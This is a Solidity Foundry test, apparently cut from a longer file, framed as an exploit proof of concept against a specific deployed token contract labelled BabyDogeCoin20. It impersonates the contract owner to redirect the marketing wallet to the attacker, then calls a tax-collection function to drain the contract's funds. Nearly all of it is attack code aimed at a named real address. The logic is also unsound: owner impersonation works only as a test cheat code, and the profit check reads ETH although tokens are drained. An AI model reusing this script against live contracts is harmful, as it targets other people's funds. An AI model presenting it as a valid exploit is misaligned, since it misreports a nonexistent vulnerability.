    function setMarketingWallet(address payable wallet) external;
    function getAllTaxes() external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5681152e9AD9628C1518266A9aB29B6d8B35693B;
    address attacker = address(this);
    BabyDogeCoin20 target;
    uint256 initialBalance;

    // ─── Setup ───────────────────────────────────────
    function setUp() public {
        target = BabyDogeCoin20(TARGET);
        vm.label(TARGET, "BabyDogeCoin20");
        vm.label(attacker, "Attacker");
        initialBalance = address(this).balance;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Step 1: Get the owner address
        address owner = target.owner();
        vm.label(owner, "Contract Owner");

        // Step 2: Impersonate the owner to change marketingWallet
        vm.startPrank(owner);
        target.setMarketingWallet(payable(attacker));
        vm.stopPrank();

        // Step 3: Verify marketingWallet is now attacker
        require(target.marketingWallet() == attacker, "Marketing wallet not set to attacker");

        // Step 4: Get contract token balance before drain
        uint256 contractTokenBalance = target.balanceOf(TARGET);
        console.log("Contract token balance before drain:", contractTokenBalance);

        // Step 5: Call getAllTaxes() to drain all funds to attacker
        if (contractTokenBalance > 0) {
            target.getAllTaxes();
        }

        // Step 6: Verify profit (attacker balance increased)
        uint256 finalBalance = address(this).balance;
        console.log("Initial balance:", initialBalance);
        console.log("Final balance:", finalBalance);
        assertGt(finalBalance, initialBalance, "Attacker balance did not increase - exploit failed");
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

